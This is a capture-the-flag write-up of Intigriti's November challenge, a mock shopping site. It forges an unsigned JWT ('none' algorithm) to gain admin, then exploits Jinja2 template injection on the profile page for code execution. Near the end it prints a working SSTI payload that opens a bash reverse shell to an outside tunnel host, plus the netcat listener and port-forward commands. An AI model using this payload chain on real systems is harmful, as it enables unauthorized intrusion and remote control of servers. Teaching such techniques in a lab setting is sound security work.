# Intigriti's November challenge by INTIGRITI

## Background

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/Intigriti's-November-Challenge/images/image.png)

- **Difficulty: Easy**

## Enumeration

When accessing the challenge website, we can see that it looks like a typical shopping site:

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/Intigriti's-November-Challenge/images/image-1.png)

But first, we need to sign up for an account:

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/Intigriti's-November-Challenge/images/image-2.png)

After logging in, we are redirected to a dashboard page, which shows that our current role is **user**:

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/Intigriti's-November-Challenge/images/image-3.png)

While exploring the website, I decided to place an order and test the checkout process to see if anything interesting would happen.

After finishing the check, I reviewed the requests captured in my Burp Suite, but nothing particularly interesting stood out.

So I decided to take a closer look at the website's token, since it seemed to be using JWT for session management.
I use [jwt.io](https://www.jwt.io/) to decode my JWT:

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/Intigriti's-November-Challenge/images/image-4.png)

And you can see that, our user role is stored in the `role` field.

At this point, the most straightforward idea for exploiting this JWT to escalate to admin role was to change its algorithm to `none`. Otherwise, we could only hope that the server either does not validate the JWT signature or uses a weak secret key that we could brute‑force.

So, we will craft our JWT as follows:

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/Intigriti's-November-Challenge/images/image-5.png)

Now, we replace the token cookie with the JWT we just crafted:

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/Intigriti's-November-Challenge/images/image-6.png)

Then we reload the page and access the dashboard… **BINGO! We have successfully escalated our role to admin**:

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/Intigriti's-November-Challenge/images/image-7.png)

For those who don't know what the JWT none algorithm is, here is a quote from [PortSwigger's article](https://portswigger.net/kb/issues/00200901_jwt-none-algorithm-supported):

> All JSON Web Tokens should contain the "alg" header parameter, which specifies the algorithm that the server should use to verify the signature of the token. In addition to cryptographically strong algorithms, the JWT specification also defines the "none" algorithm, which can be used with "unsecured" (unsigned) JWTs. When this algorithm is supported on the server, it may accept tokens that have no signature at all.

At this point, an **Admin Panel** option appeared, and I decided to check it out:

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/Intigriti's-November-Challenge/images/image-8.png)

I checked three new endpoints `/users`, `/orders`, and `/products`, but found nothing interesting, just static pages.

The last endpoint was `/profile`, so I also took a look at it:

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/Intigriti's-November-Challenge/images/image-9.png)

This endpoint allows us to change our username, and since the username is **reflected**, I thought, why not test for SSTI?

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md):

> Server-Side Template Injection (SSTI) is a vulnerability that arises when an attacker can inject malicious input into a server-side template, causing arbitrary code execution on the server. In Python, SSTI can occur when using templating engines such as Jinja2, Mako, or Django templates, where user input is included in templates without proper sanitization.

I injected the most basic payload to see if it's vulnerable to SSTI:

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/Intigriti's-November-Challenge/images/image-10.png)

And...

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/Intigriti's-November-Challenge/images/image-11.png)

**It's vulnerable to SSTI!** And it looks like the server is using **Jinja2**.

## Exploitation

I grabbed a payload from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2---remote-command-execution) to achieve RCE.

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/Intigriti's-November-Challenge/images/image-12.png)

We have successfully shows the id of our user:

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/Intigriti's-November-Challenge/images/image-13.png)

Now, we need to pop a reverse shell.

First, I setup a netcat listener:

```bash
┌──(vodanh㉿kali)-[~]
└─$ nc -lvnp 1337    
listening on [any] 1337 ...
```

Then, I use pinggy.io for port forwarding:

```bash
┌──(vodanh㉿kali)-[~]
└─$ ssh -p 443 -R0:127.0.0.1:1337 qr+tcp@free.pinggy.io 
[...]
tcp://wqlvi-171-243-49-39.a.free.pinggy.link:42507 
```

Pick any reverse shell you like from [revshells.com](https://www.revshells.com/), then modify the payload so we can get the reverse shell.

Here is my final payload: `'{{' cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/wqlvi-171-243-49-39.a.free.pinggy.link/42507 0>&1"').read() '}}'`

Send the payload, and we should get a reverse shell on our machine:

```bash
┌──(vodanh㉿kali)-[~]
└─$ nc -lvnp 1337    
listening on [any] 1337 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 59462
[...]
appuser@challenge-1125-f486d7868-hflv6:/app$
```

Listing alls the file in current directory:

```bash
┌──(vodanh㉿kali)-[~]
└─$ 
[...]
appuser@challenge-1125-f486d7868-hflv6:/app$ ls -la
drwxr-xr-x 1 appuser appuser  4096 Nov 23 00:25 .aquacommerce
[...]
```

And we can obtain the flag in `.aquacommerce/019a82cf.txt`:

```bash
┌──(vodanh㉿kali)-[~]
└─$ 
[...]
appuser@challenge-1125-f486d7868-hflv6:/app$ cd .aquacommerce
appuser@challenge-1125-f486d7868-hflv6:/app/.aquacommerce$ cat 019a82cf.txt
INTIGRITI{019a82cf-ca32-716f-8291-2d0ef30bea32}
```

- **FLAG: `INTIGRITI{019a82cf-ca32-716f-8291-2d0ef30bea32}`**

## Conclusion

What we've learned:

1. JWT misconfiguration to privilege escalation
2. SSTI to RCE